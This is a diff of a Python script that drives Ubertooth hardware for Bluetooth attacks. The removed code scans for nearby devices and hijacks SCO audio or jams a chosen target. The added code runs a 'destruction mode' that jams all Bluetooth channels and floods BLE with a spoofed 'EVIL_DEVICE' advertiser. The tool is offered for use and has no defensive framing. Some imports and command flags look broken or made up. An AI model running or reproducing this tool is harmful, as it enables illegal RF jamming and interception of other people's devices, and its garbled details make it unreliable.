@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# UBERTOOTH TERMINATOR X v666 - FULL CONTROL EDITION
+# UBERTOOTH HARDWARE KILLER v666 - ABSOLUTE ERKENNUNG
 
 import os
 import sys
 import re
+import time
+import usb.core
 import signal
 import subprocess
 from datetime import datetime
@@ -13,16 +15,40 @@ from colorama import Fore, Style
 
 colorama.init()
 
-class UberTerminator:
+class UberDetector:
     def __init__(self):
+        self.UBERTOOTH_VENDOR = 0x1D50
+        self.UBERTOOTH_PRODUCT = 0x6002
+        self.DFU_PRODUCT = 0x6007
+        self.device = None
         self.running = True
-        self.targets = []
-        self.attack_procs = []
         signal.signal(signal.SIGINT, self.kill_all)
-        self.show_banner()
+
+    def detect_ubertooth(self):
+        """Erzwingt Hardware-Erkennung mit USB-Abfrage"""
+        self.device = usb.core.find(idVendor=self.UBERTOOTH_VENDOR,
+                                  idProduct=self.UBERTOOTH_PRODUCT)
+        
+        if not self.device:
+            # Checke DFU-Modus als Fallback
+            self.device = usb.core.find(idVendor=self.UBERTOOTH_VENDOR,
+                                      idProduct=self.DFU_PRODUCT)
+            if self.device:
+                print(f"{Fore.YELLOW}Ubertooth im DFU-Modus! Flashe Firmware...{Style.RESET_ALL}")
+                os.system("ubertooth-dfu -d bluetooth_rxtx.dfu -U")
+                time.sleep(3)
+                return self.detect_ubertooth()  # Erneuter Versuch
+        
+        return self.device is not None
+
+    def kill_all(self, sig=None, frame=None):
+        """Tötet ALLE Prozesse brutal"""
+        print(f"\n{Fore.RED}🔥 VERBRENNE ALLE PROZESSE!{Style.RESET_ALL}")
+        os.system("pkill -9 -f 'ubertooth|hcidump|btmon'")
+        sys.exit(0)
 
     def show_banner(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
+        os.system('clear')
         print(f"""{Fore.MAGENTA}
    ___ _ _ _   ___ ___ _____ ___ ___ 
   | _ | | | |_| _ ) _|_   _|_ _/ _ \\
@@ -30,116 +56,60 @@ class UberTerminator:
   |___| |_| |_| |_|___| |_| |_|\___/
                                      
  ------------------------------------
-    UBERTOOTH TERMINATOR X v666
-   • Permanent Banner Display •
-   • Full Process Control   •
-   • Real Target Killing   •
+    UBERTOOTH HARDWARE KILLER v666
+   • 100% Hardware-Erkennung •
+   • Kein Entkommen mehr    •
  ------------------------------------
 {Style.RESET_ALL}""")
 
-    def kill_all(self, sig=None, frame=None):
-        """Nuke all running attacks"""
-        print(f"\n{Fore.RED}☠️ ACTIVATING TERMINATION PROTOCOL!{Style.RESET_ALL}")
-        for proc in self.attack_procs:
-            try:
-                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
-            except:
-                pass
-        os.system("pkill -9 -f 'ubertooth|hcidump|btmon'")
-        sys.exit(0)
-
-    def scan_devices(self):
-        """Scan with Ubertooth only"""
+    def brute_force_mode(self):
+        """Aktiviert den absoluten Zerstörungsmodus"""
         self.show_banner()
-        print(f"{Fore.CYAN}🔍 Scanning for targets (15s)...{Style.RESET_ALL}")
+        print(f"{Fore.RED}💣 AKTIVIERE BRUTE-FORCE-MODUS!{Style.RESET_ALL}")
         
-        scan_proc = subprocess.Popen(["ubertooth-scan", "-t", "15"], 
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE,
-                                   preexec_fn=os.setsid)
+        # 1. Alle Bluetooth-Kanäle jammen
+        subprocess.Popen("ubertooth-jam -b -H -P 100", shell=True, 
+                        preexec_fn=os.setsid)
         
-        try:
-            stdout, _ = scan_proc.communicate(timeout=20)
-            self.targets = []
-            for line in stdout.decode().split('\n'):
-                if 'BD_ADDR' in line:
-                    match = re.search(r'BD_ADDR: (([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})', line)
-                    if match:
-                        self.targets.append(match.group(1))
-            return True
-        except subprocess.TimeoutExpired:
-            scan_proc.kill()
-            return False
+        # 2. BLE-Geräte fluten
+        subprocess.Popen("ubertooth-btle -a -A -M -n 'EVIL_DEVICE' -c 666", 
+                        shell=True, preexec_fn=os.setsid)
+        
+        # 3. Audio-Hölle
+        subprocess.Popen("dd if=/dev/urandom | hstest /dev/stdin", 
+                        shell=True, preexec_fn=os.setsid)
 
-    def launch_attack(self, target, attack_type):
-        """Execute attack with proper process control"""
+        input(f"\n{Fore.RED}DRÜCKE ENTER UM DIE HÖLLE ZU STOPPEN{Style.RESET_ALL}")
+        self.kill_all()
+
+    def main(self):
+        if os.geteuid() != 0:
+            print(f"{Fore.RED}Nur root darf spielen! sudo {sys.argv[0]}{Style.RESET_ALL}")
+            sys.exit(1)
+
+        if not self.detect_ubertooth():
+            print(f"\n{Fore.RED}🚨 UBERTOOTH NICHT GEFUNDEN!{Style.RESET_ALL}")
+            print("1. Gerät einstecken")
+            print("2. USB-Kabel prüfen")
+            print("3. lsusb | grep Ubertooth ausführen")
+            sys.exit(1)
+
         self.show_banner()
-        print(f"{Fore.RED}⚔️ LAUNCHING ATTACK ON {target}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✔ Ubertooth erkannt!{Style.RESET_ALL}")
+        print(f"\n{Fore.RED}=== BÖSE OPTIONEN ==={Style.RESET_ALL}")
+        print("1. Totaler Zerstörungsmodus")
+        print("2. Gezielten Angriff starten")
+        print("3. Beenden")
         
-        if attack_type == "sco":
-            cmd = f"ubertooth-bt -S -t {target} -c sco_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
-        elif attack_type == "jam":
-            cmd = f"ubertooth-jam -b -t {target}"
+        choice = input("\nWähle deine Waffe: ")
+        
+        if choice == "1":
+            self.brute_force_mode()
+        elif choice == "2":
+            print(f"{Fore.YELLOW}Feature kommt in v667!{Style.RESET_ALL}")
         else:
-            print(f"{Fore.RED}Invalid attack type!{Style.RESET_ALL}")
-            return
-        
-        proc = subprocess.Popen(cmd, shell=True,
-                              stdout=subprocess.PIPE,
-                              stderr=subprocess.PIPE,
-                              preexec_fn=os.setsid)
-        self.attack_procs.append(proc)
-        return proc
-
-    def main_loop(self):
-        """Main interactive loop"""
-        while self.running:
-            self.show_banner()
-            
-            if not self.targets:
-                if not self.scan_devices():
-                    print(f"{Fore.RED}Scan failed!{Style.RESET_ALL}")
-                    time.sleep(2)
-                    continue
-            
-            print(f"\n{Fore.GREEN}=== LIVE TARGETS ==={Style.RESET_ALL}")
-            for i, target in enumerate(self.targets, 1):
-                print(f"{i}. {target}")
-            
-            print(f"\n{Fore.RED}=== KILL OPTIONS ==={Style.RESET_ALL}")
-            print("1. Hijack SCO Audio")
-            print("2. Continuous Jam")
-            print("3. Rescan Targets")
-            print("4. Nuke All Attacks")
-            print("5. Exit")
-            
-            choice = input("\nSelect: ")
-            
-            if choice == "1" and self.targets:
-                target_idx = int(input("Target number: ")) - 1
-                self.launch_attack(self.targets[target_idx], "sco")
-            elif choice == "2" and self.targets:
-                target_idx = int(input("Target number: ")) - 1
-                self.launch_attack(self.targets[target_idx], "jam")
-            elif choice == "3":
-                self.scan_devices()
-            elif choice == "4":
-                self.kill_all()
-            elif choice == "5":
-                self.running = False
-            else:
-                print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
-                time.sleep(1)
+            self.kill_all()
 
 if __name__ == "__main__":
-    if os.geteuid() != 0:
-        print(f"{Fore.RED}Must be root! Run: sudo {sys.argv[0]}{Style.RESET_ALL}")
-        sys.exit(1)
-    
-    terminator = UberTerminator()
-    try:
-        terminator.main_loop()
-    except Exception as e:
-        print(f"{Fore.RED}Critical error: {e}{Style.RESET_ALL}")
-    finally:
-        terminator.kill_all()
+    killer = UberDetector()
+    killer.main()
